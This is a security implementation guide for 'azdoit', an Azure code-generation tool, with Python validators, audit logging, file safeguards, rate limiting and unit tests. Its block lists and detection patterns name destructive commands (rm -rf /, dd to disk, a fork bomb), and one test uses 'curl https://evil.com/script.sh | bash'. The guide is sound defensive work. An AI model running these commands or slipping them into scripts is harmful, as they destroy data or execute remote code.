# azdoit Security Implementation Guide

**Version**: 1.0.0
**Date**: 2025-10-20
**Companion**: AZDOIT_SECURITY_DESIGN.md

## Overview

This document provides concrete implementation guidance for the security controls defined in AZDOIT_SECURITY_DESIGN.md. Each section includes production-ready code, integration points, and testing strategies.

---

## 1. Project Structure

```
src/azlin/
├── azdoit/
│   ├── __init__.py
│   ├── security/
│   │   ├── __init__.py
│   │   ├── validators.py        # Input/code validators
│   │   ├── audit.py              # Audit logging
│   │   ├── file_security.py     # Secure file operations
│   │   └── rate_limiting.py     # API rate limiting
│   ├── agents/
│   │   ├── planner.py            # Planning agent
│   │   ├── researcher.py         # Research agent
│   │   └── executor.py           # Execution agent
│   ├── generators/
│   │   ├── terraform.py          # Terraform generation
│   │   ├── shell.py              # Shell script generation
│   │   └── python.py             # Python code generation
│   └── state/
│       ├── objective.py          # Objective state management
│       └── persistence.py        # State persistence

tests/
├── security/
│   ├── test_validators.py
│   ├── test_audit.py
│   └── test_penetration.py
```

---

## 2. Security Module Implementation

### 2.1 validators.py - Input and Code Validation

```python
"""Security validators for azdoit inputs and generated code.

This module provides comprehensive validation for:
- User objectives (Azure-only, size limits)
- Resource names and configurations
- Generated Terraform, shell scripts, and Python code
- File paths and permissions

All validators follow fail-secure principles.
"""

import ast
import json
import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional

# Import existing security infrastructure
from amplihack.context_preservation_secure import (
    SecurityValidator as InputSecurityValidator,
    InputValidationError
)
from amplihack.reflection.security import ContentSanitizer


@dataclass
class ValidationResult:
    """Result of validation operation."""

    is_valid: bool
    findings: List[str]
    sanitized_content: Optional[str] = None
    confidence: float = 1.0

    @property
    def has_critical_findings(self) -> bool:
        """Check if any findings are critical severity."""
        return any(
            'dangerous' in f.lower() or 'critical' in f.lower()
            for f in self.findings
        )


class ObjectiveValidator:
    """Validates user objectives for security and Azure-scope.

    Security Features:
    - Azure-only filtering (whitelist/blacklist)
    - Input size limits (max 5000 chars)
    - Sanitization using existing infrastructure
    - Claude SDK classification for ambiguous cases
    """

    MAX_OBJECTIVE_LENGTH = 5000  # characters
    MAX_REQUIREMENTS = 20

    # Azure service keywords (whitelist)
    AZURE_KEYWORDS = {
        'azure', 'vm', 'aks', 'kubernetes', 'storage', 'blob', 'file',
        'network', 'vnet', 'subnet', 'nsg', 'sql', 'cosmos', 'database',
        'function', 'app service', 'web app', 'container', 'acr',
        'key vault', 'monitor', 'log analytics', 'application insights',
        'load balancer', 'traffic manager', 'cdn', 'front door',
        'subscription', 'resource group', 'eastus', 'westus', 'westeurope',
    }

    # Dangerous keywords (blacklist)
    DANGEROUS_KEYWORDS = {
        # Other cloud providers
        'aws', 'amazon', 'ec2', 's3', 'lambda', 'cloudformation',
        'gcp', 'google cloud', 'compute engine', 'cloud storage',
        'alibaba', 'alicloud', 'tencent',
        # Destructive operations
        'delete all', 'remove all', 'destroy all', 'drop database',
        'truncate table', 'format', 'wipe', 'erase',
        # Local filesystem operations
        '/etc/', '/var/', '/usr/', '/root/', 'local file',
        'c:\\windows', 'c:\\program files',
        # Network exfiltration
        'exfiltrate', 'steal', 'extract', 'copy to attacker',
        'send to', 'upload to', 'http://', 'https://',
    }

    @classmethod
    def validate_objective(cls, objective: str) -> ValidationResult:
        """Validate objective is Azure-scoped and safe.

        Args:
            objective: User's natural language objective

        Returns:
            ValidationResult with is_valid flag and findings

        Raises:
            InputValidationError: If input exceeds size limits
        """
        findings = []

        # Security: Input size validation
        if len(objective) > cls.MAX_OBJECTIVE_LENGTH:
            raise InputValidationError(
                f"Objective exceeds max length ({cls.MAX_OBJECTIVE_LENGTH})"
            )

        # Security: Sanitize input using existing infrastructure
        try:
            sanitized = InputSecurityValidator.sanitize_input(objective)
        except Exception as e:
            findings.append(f"Input sanitization failed: {e}")
            return ValidationResult(
                is_valid=False,
                findings=findings,
                sanitized_content=None
            )

        if not sanitized or len(sanitized.strip()) < 10:
            findings.append("Objective too short or empty after sanitization")
            return ValidationResult(
                is_valid=False,
                findings=findings,
                sanitized_content=sanitized
            )

        # Check for Azure keywords
        objective_lower = sanitized.lower()
        azure_keywords_found = [
            keyword for keyword in cls.AZURE_KEYWORDS
            if keyword in objective_lower
        ]

        # Check for dangerous keywords
        dangerous_keywords_found = [
            keyword for keyword in cls.DANGEROUS_KEYWORDS
            if keyword in objective_lower
        ]

        # Evaluate findings
        if not azure_keywords_found:
            findings.append(
                "No Azure keywords found. Objective must be Azure-scoped."
            )

        if dangerous_keywords_found:
            findings.append(
                f"Dangerous keywords detected: {', '.join(dangerous_keywords_found)}"
            )

        is_valid = bool(azure_keywords_found) and not bool(dangerous_keywords_found)

        return ValidationResult(
            is_valid=is_valid,
            findings=findings if findings else ["Validation passed"],
            sanitized_content=sanitized,
            confidence=0.9 if is_valid else 0.1
        )


class ResourceValidator:
    """Validates Azure resource names and configurations."""

    # Azure resource name patterns by type
    RESOURCE_PATTERNS = {
        'storage_account': re.compile(r'^[a-z0-9]{3,24}$'),
        'vm': re.compile(r'^[a-zA-Z0-9][-a-zA-Z0-9]{0,62}[a-zA-Z0-9]$'),
        'aks': re.compile(r'^[a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]$'),
        'resource_group': re.compile(r'^[a-zA-Z0-9][-a-zA-Z0-9_.()]{0,88}[a-zA-Z0-9_()]$'),
    }

    LOCATION_PATTERN = re.compile(r'^[a-z]+[a-z0-9]*$')

    @classmethod
    def validate_resource_name(
        cls,
        name: str,
        resource_type: str
    ) -> ValidationResult:
        """Validate Azure resource name format.

        Args:
            name: Resource name to validate
            resource_type: Type of resource (vm, storage_account, etc.)

        Returns:
            ValidationResult indicating validity
        """
        findings = []

        if not name:
            findings.append("Resource name is empty")
            return ValidationResult(is_valid=False, findings=findings)

        # Get pattern for resource type
        pattern = cls.RESOURCE_PATTERNS.get(resource_type)
        if not pattern:
            # Default validation
            pattern = re.compile(r'^[a-zA-Z0-9][-a-zA-Z0-9]{0,62}[a-zA-Z0-9]$')

        if not pattern.match(name):
            findings.append(
                f"Resource name '{name}' does not match pattern for {resource_type}"
            )
            return ValidationResult(is_valid=False, findings=findings)

        return ValidationResult(
            is_valid=True,
            findings=["Resource name validation passed"]
        )

    @classmethod
    def validate_location(cls, location: str) -> ValidationResult:
        """Validate Azure region/location."""
        findings = []

        if not location:
            findings.append("Location is empty")
            return ValidationResult(is_valid=False, findings=findings)

        if not cls.LOCATION_PATTERN.match(location):
            findings.append(f"Invalid Azure location format: {location}")
            return ValidationResult(is_valid=False, findings=findings)

        # Optional: Validate against known Azure regions
        KNOWN_REGIONS = {
            'eastus', 'eastus2', 'westus', 'westus2', 'westus3',
            'centralus', 'northcentralus', 'southcentralus',
            'westeurope', 'northeurope', 'uksouth', 'ukwest',
            'francecentral', 'germanywestcentral', 'switzerlandnorth',
            'japaneast', 'japanwest', 'australiaeast', 'australiasoutheast',
        }

        if location not in KNOWN_REGIONS:
            findings.append(f"Warning: Unknown Azure region '{location}'")
            # Not a failure - Azure adds new regions

        return ValidationResult(
            is_valid=True,
            findings=findings if findings else ["Location validation passed"]
        )


class TerraformValidator:
    """Validates Terraform configurations for security issues.

    Security Features:
    - terraform validate for syntax
    - tfsec for security scanning
    - Pattern matching for insecure configurations
    - Dangerous resource type detection
    """

    # Dangerous resource types (require extra confirmation)
    DANGEROUS_RESOURCES = {
        'azurerm_role_assignment',
        'azurerm_role_definition',
        'azurerm_network_security_rule',
        'azurerm_key_vault_access_policy',
        'azurerm_storage_account_network_rules',
    }

    # Insecure patterns (regex, description, severity)
    INSECURE_PATTERNS = [
        (
            r'source_address_prefix\s*=\s*["\']0\.0\.0\.0/0["\']',
            'NSG allows unrestricted internet access',
            'high'
        ),
        (
            r'source_address_prefix\s*=\s*["\']\*["\']',
            'NSG allows unrestricted access',
            'high'
        ),
        (
            r'enable_public_ip\s*=\s*true',
            'Public IP enabled - consider private networking',
            'medium'
        ),
        (
            r'admin_password\s*=\s*["\']\w+["\']',
            'CRITICAL: Hardcoded password detected',
            'critical'
        ),
        (
            r'client_secret\s*=\s*["\']\w+["\']',
            'CRITICAL: Hardcoded client secret detected',
            'critical'
        ),
        (
            r'role_definition_name\s*=\s*["\']Owner["\']',
            'Excessive privilege: Owner role assignment',
            'high'
        ),
        (
            r'role_definition_name\s*=\s*["\']Contributor["\']',
            'Broad privilege: Contributor role assignment',
            'medium'
        ),
    ]

    @classmethod
    def validate_terraform(cls, tf_content: str) -> ValidationResult:
        """Validate Terraform configuration for security issues.

        Args:
            tf_content: Terraform configuration content

        Returns:
            ValidationResult with findings from all checks
        """
        findings = []
        sanitizer = ContentSanitizer()

        # Create temporary directory for validation
        temp_dir = Path(tempfile.mkdtemp(prefix='azdoit_tf_'))
        try:
            # Write Terraform file with secure permissions
            tf_file = temp_dir / "main.tf"
            tf_file.write_text(tf_content)
            tf_file.chmod(0o600)

            # Run terraform init
            try:
                result = subprocess.run(
                    ['terraform', 'init', '-backend=false'],
                    cwd=temp_dir,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    check=True
                )
            except subprocess.CalledProcessError as e:
                # Sanitize error output
                safe_error = sanitizer.sanitize_content(e.stderr, max_length=500)
                findings.append(f"terraform init failed: {safe_error}")
            except FileNotFoundError:
                findings.append(
                    "terraform not found in PATH - install from https://terraform.io"
                )

            # Run terraform validate
            try:
                result = subprocess.run(
                    ['terraform', 'validate', '-json'],
                    cwd=temp_dir,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.returncode != 0:
                    try:
                        validate_output = json.loads(result.stdout)
                        for diag in validate_output.get('diagnostics', []):
                            severity = diag.get('severity', 'error')
                            summary = diag.get('summary', '')
                            findings.append(f"terraform validate [{severity}]: {summary}")
                    except json.JSONDecodeError:
                        safe_error = sanitizer.sanitize_content(
                            result.stderr, max_length=500
                        )
                        findings.append(f"terraform validate failed: {safe_error}")
            except FileNotFoundError:
                pass  # Already reported above

            # Run tfsec security scanner
            try:
                result = subprocess.run(
                    ['tfsec', str(temp_dir), '--format', 'json', '--soft-fail'],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                try:
                    tfsec_output = json.loads(result.stdout)
                    for issue in tfsec_output.get('results', []):
                        rule_id = issue.get('rule_id', 'unknown')
                        description = issue.get('description', '')
                        severity = issue.get('severity', 'MEDIUM')
                        findings.append(
                            f"tfsec [{severity}] {rule_id}: {description}"
                        )
                except json.JSONDecodeError:
                    # tfsec not installed or error
                    findings.append(
                        "tfsec not found - install for enhanced security scanning"
                    )
            except FileNotFoundError:
                findings.append(
                    "tfsec not found - install from https://github.com/aquasecurity/tfsec"
                )

            # Check for dangerous resource types
            for resource_type in cls.DANGEROUS_RESOURCES:
                if resource_type in tf_content:
                    findings.append(
                        f"WARNING: Dangerous resource type '{resource_type}' "
                        f"requires manual review"
                    )

            # Check for insecure patterns
            for pattern, description, severity in cls.INSECURE_PATTERNS:
                matches = re.findall(pattern, tf_content, re.IGNORECASE)
                if matches:
                    findings.append(f"[{severity.upper()}] {description}")

        finally:
            # Cleanup temp directory
            shutil.rmtree(temp_dir, ignore_errors=True)

        # Determine validity
        has_critical = any('CRITICAL' in f for f in findings)
        has_high = any('high' in f.lower() or 'error' in f.lower() for f in findings)

        is_valid = not has_critical and not has_high

        return ValidationResult(
            is_valid=is_valid,
            findings=findings if findings else ["Terraform validation passed"],
            confidence=0.8 if is_valid else 0.2
        )


class ShellScriptValidator:
    """Validates shell scripts for dangerous commands.

    Security Features:
    - Blacklist of dangerous commands
    - Pattern matching for destructive operations
    - shellcheck integration for best practices
    """

    # Dangerous commands (exact matches)
    DANGEROUS_COMMANDS = {
        'rm -rf /',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs',
        'fdisk',
        'parted',
        ':(){:|:&};:',  # Fork bomb
        '> /dev/sda',
        'chmod -R 777',
    }

    # Dangerous patterns (regex, description, severity)
    DANGEROUS_PATTERNS = [
        (r'rm\s+-rf\s+/', 'Dangerous rm command targeting root', 'critical'),
        (r'dd\s+if=', 'Direct disk write detected', 'critical'),
        (r'curl\s+[^\s]+\s*\|\s*bash', 'Unvalidated code execution via curl', 'high'),
        (r'wget\s+[^\s]+\s*\|\s*sh', 'Unvalidated code execution via wget', 'high'),
        (r'eval\s+', 'eval usage - risk of code injection', 'medium'),
        (r'exec\s+', 'exec usage - review carefully', 'medium'),
        (r'chmod\s+777', 'Insecure file permissions', 'medium'),
    ]

    @classmethod
    def validate_shell_script(cls, script_content: str) -> ValidationResult:
        """Validate shell script for dangerous commands.

        Args:
            script_content: Shell script content

        Returns:
            ValidationResult with findings
        """
        findings = []
        sanitizer = ContentSanitizer()

        # Check for exact dangerous commands
        for dangerous_cmd in cls.DANGEROUS_COMMANDS:
            if dangerous_cmd in script_content:
                findings.append(
                    f"CRITICAL: Dangerous command detected: {dangerous_cmd}"
                )

        # Check for dangerous patterns
        for pattern, description, severity in cls.DANGEROUS_PATTERNS:
            matches = re.findall(pattern, script_content)
            if matches:
                findings.append(f"[{severity.upper()}] {description}")

        # Run shellcheck
        temp_file = Path(tempfile.mktemp(suffix='.sh', prefix='azdoit_sh_'))
        try:
            temp_file.write_text(script_content)
            temp_file.chmod(0o600)

            result = subprocess.run(
                ['shellcheck', '-f', 'json', str(temp_file)],
                capture_output=True,
                text=True,
                timeout=30
            )

            try:
                shellcheck_output = json.loads(result.stdout)
                for issue in shellcheck_output:
                    level = issue.get('level', 'info')
                    message = issue.get('message', '')
                    line = issue.get('line', 0)

                    if level in ['error', 'warning']:
                        findings.append(
                            f"shellcheck [{level}] line {line}: {message}"
                        )
            except (json.JSONDecodeError, FileNotFoundError):
                findings.append(
                    "shellcheck not found - install from https://www.shellcheck.net"
                )

        finally:
            temp_file.unlink(missing_ok=True)

        # Determine validity
        has_critical = any('CRITICAL' in f for f in findings)
        has_high = any('[HIGH]' in f for f in findings)

        is_valid = not has_critical and not has_high

        return ValidationResult(
            is_valid=is_valid,
            findings=findings if findings else ["Shell script validation passed"],
            confidence=0.85 if is_valid else 0.15
        )


class PythonCodeValidator:
    """Validates Python code for dangerous operations.

    Security Features:
    - AST analysis for imports and function calls
    - Whitelist of allowed imports
    - Detection of dangerous built-ins (eval, exec)
    """

    # Allowed imports (whitelist)
    ALLOWED_IMPORTS = {
        # Standard library - safe modules
        'json', 'os', 'sys', 'pathlib', 'datetime', 'typing',
        'dataclasses', 're', 'logging', 'argparse', 'time',
        'collections', 'itertools', 'functools', 'operator',
        'math', 'random', 'string', 'textwrap', 'uuid',

        # Azure SDKs
        'azure.identity', 'azure.mgmt', 'azure.storage',
        'azure.keyvault', 'azure.monitor', 'azure.core',

        # Anthropic SDK
        'anthropic',

        # Safe third-party
        'requests', 'httpx', 'pydantic', 'yaml',
    }

    # Dangerous built-in functions
    DANGEROUS_BUILTINS = {
        'eval', 'exec', 'compile', '__import__',
        'open',  # Requires path validation
    }

    # Dangerous patterns
    DANGEROUS_PATTERNS = [
        (r'subprocess\..*shell=True', 'subprocess with shell=True is dangerous'),
        (r'os\.system\(', 'os.system() usage is dangerous'),
        (r'__import__\(', '__import__() usage is dangerous'),
    ]

    @classmethod
    def validate_python_code(cls, code: str) -> ValidationResult:
        """Validate Python code for dangerous operations.

        Args:
            code: Python code to validate

        Returns:
            ValidationResult with findings
        """
        findings = []

        try:
            # Parse with AST
            tree = ast.parse(code)

            # Walk AST and check for issues
            for node in ast.walk(tree):
                # Check imports
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        if not cls._is_allowed_import(alias.name):
                            findings.append(
                                f"Disallowed import: {alias.name}"
                            )

                elif isinstance(node, ast.ImportFrom):
                    if node.module and not cls._is_allowed_import(node.module):
                        findings.append(
                            f"Disallowed import: {node.module}"
                        )

                # Check for dangerous function calls
                elif isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        if node.func.id in cls.DANGEROUS_BUILTINS:
                            findings.append(
                                f"Dangerous function call: {node.func.id}()"
                            )

            # Check for dangerous patterns
            for pattern, description in cls.DANGEROUS_PATTERNS:
                if re.search(pattern, code):
                    findings.append(description)

        except SyntaxError as e:
            findings.append(f"Python syntax error: {e}")

        is_valid = len(findings) == 0

        return ValidationResult(
            is_valid=is_valid,
            findings=findings if findings else ["Python code validation passed"],
            confidence=0.9 if is_valid else 0.1
        )

    @classmethod
    def _is_allowed_import(cls, module_name: str) -> bool:
        """Check if import is allowed."""
        if not module_name:
            return True

        # Check exact match
        if module_name in cls.ALLOWED_IMPORTS:
            return True

        # Check prefix match (e.g., azure.mgmt.compute)
        for allowed in cls.ALLOWED_IMPORTS:
            if module_name.startswith(allowed + '.'):
                return True

        return False
```

### 2.2 audit.py - Audit Logging

```python
"""Audit logging for azdoit Azure operations.

All Azure operations are logged with:
- Timestamp (UTC)
- User identity
- Subscription ID
- Operation type
- Resource affected
- Status (success/failure/denied)
- Cost estimate
"""

import json
import logging
import os
from dataclasses import asdict, dataclass
from datetime import datetime
from pathlib import Path
from typing import Optional

from amplihack.reflection.security import ContentSanitizer

logger = logging.getLogger(__name__)


@dataclass
class AuditLogEntry:
    """Structured audit log entry."""

    timestamp: str
    session_id: str
    user: str
    subscription_id: str
    operation: str
    resource_type: str
    resource_id: str
    status: str  # "success", "failure", "denied"
    error: Optional[str] = None
    cost_estimate: Optional[float] = None
    duration_seconds: Optional[float] = None

    def to_json(self) -> str:
        """Serialize to JSON for logging."""
        return json.dumps(asdict(self), indent=None)


class AuditLogger:
    """Centralized audit logging for all Azure operations.

    Security Features:
    - All operations logged (no gaps)
    - Structured JSON format for parsing
    - Credential sanitization
    - Secure file permissions (0600)
    - Session-based log files
    """

    def __init__(self, session_id: str):
        """Initialize audit logger.

        Args:
            session_id: Unique session identifier
        """
        self.session_id = session_id
        self.sanitizer = ContentSanitizer()

        # Create log directory structure
        log_dir = Path.home() / '.claude' / 'runtime' / 'logs' / 'azdoit' / session_id
        log_dir.mkdir(parents=True, exist_ok=True)

        # Create audit log file with secure permissions
        self.log_file = log_dir / 'audit.log'
        if not self.log_file.exists():
            self.log_file.touch(mode=0o600)  # Owner read/write only

    def log_operation(
        self,
        operation: str,
        resource_type: str,
        resource_id: str,
        status: str,
        error: Optional[str] = None,
        cost_estimate: Optional[float] = None,
        duration_seconds: Optional[float] = None
    ):
        """Log an Azure operation.

        Args:
            operation: Operation name (e.g., 'terraform_apply', 'az_vm_create')
            resource_type: Type of resource (vm, storage, aks, etc.)
            resource_id: Azure resource ID or name
            status: Operation status (success/failure/denied)
            error: Error message if failed
            cost_estimate: Estimated cost in USD
            duration_seconds: Operation duration
        """
        # Get user identity
        try:
            user = os.getlogin()
        except Exception:
            user = os.environ.get('USER', 'unknown')

        # Get subscription ID (cached in environment)
        subscription_id = os.environ.get('AZURE_SUBSCRIPTION_ID', 'unknown')

        # Create audit entry
        entry = AuditLogEntry(
            timestamp=datetime.utcnow().isoformat() + 'Z',
            session_id=self.session_id,
            user=user,
            subscription_id=subscription_id,
            operation=operation,
            resource_type=resource_type,
            resource_id=resource_id,
            status=status,
            error=error,
            cost_estimate=cost_estimate,
            duration_seconds=duration_seconds
        )

        # Security: Sanitize error messages before logging
        if entry.error:
            entry.error = self.sanitizer.sanitize_content(
                entry.error, max_length=500
            )

        # Write to log file (append mode)
        with open(self.log_file, 'a') as f:
            f.write(entry.to_json() + '\n')

        logger.debug(f"Audit log: {entry.operation} on {entry.resource_id} - {entry.status}")

    def get_recent_operations(self, limit: int = 100) -> list[AuditLogEntry]:
        """Get recent operations from audit log.

        Args:
            limit: Maximum number of entries to return

        Returns:
            List of recent audit log entries
        """
        if not self.log_file.exists():
            return []

        entries = []
        with open(self.log_file) as f:
            lines = f.readlines()
            for line in lines[-limit:]:
                try:
                    data = json.loads(line)
                    entries.append(AuditLogEntry(**data))
                except Exception:
                    continue

        return entries
```

### 2.3 file_security.py - Secure File Operations

```python
"""Secure file operations for azdoit.

Features:
- Path traversal protection
- Secure file permissions (0600 for sensitive files)
- Validation of allowed directories
- Temporary file management
"""

import os
import tempfile
from pathlib import Path
from typing import List


class SecurityError(Exception):
    """Raised when security validation fails."""
    pass


class SecureFileManager:
    """Manages secure file operations for azdoit.

    Security Features:
    - Path validation (within allowed directories)
    - Secure permissions (0600 for sensitive files)
    - Temporary file cleanup
    - Directory traversal prevention
    """

    # Allowed base directories for azdoit operations
    ALLOWED_BASE_DIRS = [
        Path.home() / '.claude' / 'runtime' / 'azdoit',
        Path.home() / '.azlin' / 'objectives',
        Path(tempfile.gettempdir()) / 'azdoit',
    ]

    @classmethod
    def validate_path(cls, path: Path) -> Path:
        """Validate path is within allowed directories.

        Args:
            path: Path to validate

        Returns:
            Resolved absolute path

        Raises:
            SecurityError: If path is outside allowed directories
        """
        # Resolve to absolute path (follows symlinks)
        resolved = path.resolve()

        # Check if within allowed directories
        for allowed_dir in cls.ALLOWED_BASE_DIRS:
            try:
                resolved.relative_to(allowed_dir)
                return resolved  # Valid path
            except ValueError:
                continue

        raise SecurityError(
            f"Path outside allowed directories: {resolved}\n"
            f"Allowed base directories: {cls.ALLOWED_BASE_DIRS}"
        )

    @classmethod
    def create_secure_file(
        cls,
        path: Path,
        content: str,
        sensitive: bool = False
    ):
        """Create file with secure permissions.

        Args:
            path: File path (will be validated)
            content: File content
            sensitive: If True, set permissions to 0600

        Raises:
            SecurityError: If path validation fails
        """
        # Validate path
        safe_path = cls.validate_path(path)

        # Create parent directories
        safe_path.parent.mkdir(parents=True, exist_ok=True)

        # Write file
        safe_path.write_text(content)

        # Set secure permissions
        if sensitive:
            safe_path.chmod(0o600)  # Owner read/write only
        else:
            safe_path.chmod(0o644)  # Owner read/write, others read

    @classmethod
    def create_temp_file(
        cls,
        suffix: str = '',
        sensitive: bool = False
    ) -> Path:
        """Create temporary file in secure location.

        Args:
            suffix: File suffix (e.g., '.tf', '.sh')
            sensitive: If True, set permissions to 0600

        Returns:
            Path to temporary file
        """
        temp_dir = Path(tempfile.gettempdir()) / 'azdoit'
        temp_dir.mkdir(exist_ok=True)

        fd, temp_path = tempfile.mkstemp(suffix=suffix, dir=temp_dir)
        os.close(fd)

        temp_file = Path(temp_path)
        if sensitive:
            temp_file.chmod(0o600)
        else:
            temp_file.chmod(0o644)

        return temp_file

    @classmethod
    def cleanup_temp_files(cls):
        """Clean up temporary files."""
        temp_dir = Path(tempfile.gettempdir()) / 'azdoit'
        if temp_dir.exists():
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
```

### 2.4 rate_limiting.py - API Rate Limiting

```python
"""Rate limiting for external API calls.

Implements token bucket algorithm for:
- Azure API calls
- Claude API calls
- MS Learn scraping
"""

import logging
import threading
import time
from typing import Optional

logger = logging.getLogger(__name__)


class RateLimiter:
    """Token bucket rate limiter.

    Security Features:
    - Prevents API abuse
    - Protects against quota exhaustion
    - Thread-safe implementation
    """

    def __init__(self, rate: float, burst: int, name: str = 'default'):
        """Initialize rate limiter.

        Args:
            rate: Tokens per second (requests/second)
            burst: Maximum burst size (tokens available at start)
            name: Name for logging
        """
        self.rate = rate
        self.burst = burst
        self.name = name
        self.tokens = float(burst)
        self.last_update = time.time()
        self.lock = threading.Lock()

    def acquire(self, tokens: int = 1, timeout: Optional[float] = None) -> bool:
        """Acquire tokens from bucket.

        Args:
            tokens: Number of tokens to acquire
            timeout: Maximum wait time in seconds (None = wait forever)

        Returns:
            True if tokens acquired, False if timeout
        """
        deadline = time.time() + (timeout or float('inf'))

        while True:
            with self.lock:
                # Refill tokens based on elapsed time
                now = time.time()
                elapsed = now - self.last_update
                self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
                self.last_update = now

                # Check if enough tokens available
                if self.tokens >= tokens:
                    self.tokens -= tokens
                    logger.debug(
                        f"RateLimiter[{self.name}]: Acquired {tokens} tokens, "
                        f"{self.tokens:.2f} remaining"
                    )
                    return True

            # Check timeout
            if time.time() >= deadline:
                logger.warning(
                    f"RateLimiter[{self.name}]: Timeout waiting for {tokens} tokens"
                )
                return False

            # Wait before retrying
            time.sleep(0.1)

    def __enter__(self):
        """Context manager entry."""
        self.acquire()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        pass


# Global rate limiters
AZURE_API_LIMITER = RateLimiter(rate=10.0, burst=20, name='azure_api')
CLAUDE_API_LIMITER = RateLimiter(rate=5.0, burst=10, name='claude_api')
MS_LEARN_LIMITER = RateLimiter(rate=1.0, burst=5, name='ms_learn')
```

---

## 3. Integration with Existing Security Infrastructure

### 3.1 Leverage Existing Components

The azdoit security implementation builds on existing security infrastructure:

1. **Input Sanitization**: Reuse `amplihack/context_preservation_secure.py`
   - `SecurityValidator.sanitize_input()`
   - `SecurityValidator.validate_input_size()`
   - Input size limits and regex timeout protection

2. **Credential Sanitization**: Extend `amplihack/reflection/security.py`
   - `ContentSanitizer.sanitize_content()`
   - Add Azure-specific patterns (subscription IDs, tokens)

3. **Azure Authentication**: Use existing `azure_auth.py`
   - `AzureAuthenticator.get_credentials()`
   - Azure CLI delegation (no credential storage)

### 3.2 Integration Example

```python
# src/azlin/azdoit/objective_processor.py
from amplihack.context_preservation_secure import SecurityValidator
from amplihack.reflection.security import ContentSanitizer
from azure_auth import AzureAuthenticator

from azdoit.security.validators import ObjectiveValidator
from azdoit.security.audit import AuditLogger
from azdoit.security.file_security import SecureFileManager


class ObjectiveProcessor:
    """Processes user objectives with full security controls."""

    def __init__(self, session_id: str):
        self.session_id = session_id
        self.audit_logger = AuditLogger(session_id)
        self.auth = AzureAuthenticator()

    def process_objective(self, objective: str):
        """Process objective with security validation.

        Args:
            objective: User's natural language objective

        Raises:
            SecurityError: If validation fails
        """
        # Step 1: Validate and sanitize input
        validation_result = ObjectiveValidator.validate_objective(objective)
        if not validation_result.is_valid:
            self.audit_logger.log_operation(
                operation='process_objective',
                resource_type='objective',
                resource_id=self.session_id,
                status='denied',
                error=f"Validation failed: {validation_result.findings}"
            )
            raise SecurityError(f"Invalid objective: {validation_result.findings}")

        # Step 2: Verify Azure authentication
        try:
            credentials = self.auth.get_credentials()
            subscription_id = self.auth.get_subscription_id()
        except Exception as e:
            self.audit_logger.log_operation(
                operation='process_objective',
                resource_type='auth',
                resource_id='azure',
                status='failure',
                error=str(e)
            )
            raise

        # Step 3: Save objective to secure file
        objective_file = Path.home() / '.azlin' / 'objectives' / self.session_id / 'objective.txt'
        SecureFileManager.create_secure_file(
            objective_file,
            validation_result.sanitized_content,
            sensitive=False
        )

        # Step 4: Log successful processing
        self.audit_logger.log_operation(
            operation='process_objective',
            resource_type='objective',
            resource_id=self.session_id,
            status='success'
        )
```

---

## 4. Testing Strategy

### 4.1 Unit Tests (tests/security/test_validators.py)

```python
import pytest
from azdoit.security.validators import (
    ObjectiveValidator,
    TerraformValidator,
    ShellScriptValidator,
    PythonCodeValidator,
    ValidationResult
)


class TestObjectiveValidator:
    """Test objective validation."""

    def test_valid_azure_objective(self):
        """Should accept valid Azure objectives."""
        objective = "Deploy an AKS cluster in eastus with 3 nodes"
        result = ObjectiveValidator.validate_objective(objective)

        assert result.is_valid
        assert result.confidence > 0.8
        assert not result.has_critical_findings

    def test_rejects_aws_objective(self):
        """Should reject objectives mentioning AWS."""
        objective = "Create an EC2 instance in AWS us-east-1"
        result = ObjectiveValidator.validate_objective(objective)

        assert not result.is_valid
        assert 'aws' in ' '.join(result.findings).lower()

    def test_rejects_destructive_objective(self):
        """Should reject destructive operations."""
        objective = "Delete all Azure resources in subscription"
        result = ObjectiveValidator.validate_objective(objective)

        assert not result.is_valid
        assert any('delete all' in f.lower() for f in result.findings)

    def test_rejects_oversized_objective(self):
        """Should reject objectives exceeding size limit."""
        objective = "A" * 10000
        with pytest.raises(Exception):  # InputValidationError
            ObjectiveValidator.validate_objective(objective)


class TestTerraformValidator:
    """Test Terraform validation."""

    def test_detects_public_ip(self):
        """Should detect public IP exposure."""
        tf_config = '''
        resource "azurerm_network_security_rule" "test" {
            source_address_prefix = "0.0.0.0/0"
        }
        '''
        result = TerraformValidator.validate_terraform(tf_config)

        assert not result.is_valid
        assert any('internet access' in f.lower() for f in result.findings)

    def test_detects_hardcoded_password(self):
        """Should detect hardcoded passwords."""
        tf_config = '''
        resource "azurerm_virtual_machine" "test" {
            admin_password = "SuperSecret123!"
        }
        '''
        result = TerraformValidator.validate_terraform(tf_config)

        assert not result.is_valid
        assert any('password' in f.lower() for f in result.findings)


class TestShellScriptValidator:
    """Test shell script validation."""

    def test_detects_dangerous_rm(self):
        """Should detect dangerous rm commands."""
        script = "rm -rf /"
        result = ShellScriptValidator.validate_shell_script(script)

        assert not result.is_valid
        assert result.has_critical_findings

    def test_detects_curl_pipe_bash(self):
        """Should detect curl | bash pattern."""
        script = "curl https://evil.com/script.sh | bash"
        result = ShellScriptValidator.validate_shell_script(script)

        assert not result.is_valid
        assert any('unvalidated' in f.lower() for f in result.findings)


class TestPythonCodeValidator:
    """Test Python code validation."""

    def test_detects_eval(self):
        """Should detect eval() usage."""
        code = 'eval("print(1+1)")'
        result = PythonCodeValidator.validate_python_code(code)

        assert not result.is_valid
        assert any('eval' in f.lower() for f in result.findings)

    def test_detects_disallowed_import(self):
        """Should detect disallowed imports."""
        code = 'import pickle'
        result = PythonCodeValidator.validate_python_code(code)

        assert not result.is_valid
        assert any('pickle' in f for f in result.findings)

    def test_allows_azure_sdk(self):
        """Should allow Azure SDK imports."""
        code = '''
from azure.identity import DefaultAzureCredential
from azure.mgmt.compute import ComputeManagementClient
        '''
        result = PythonCodeValidator.validate_python_code(code)

        assert result.is_valid
```

### 4.2 Integration Tests (tests/security/test_integration.py)

```python
import tempfile
from pathlib import Path
from azdoit.security.file_security import SecureFileManager, SecurityError


class TestSecureFileManager:
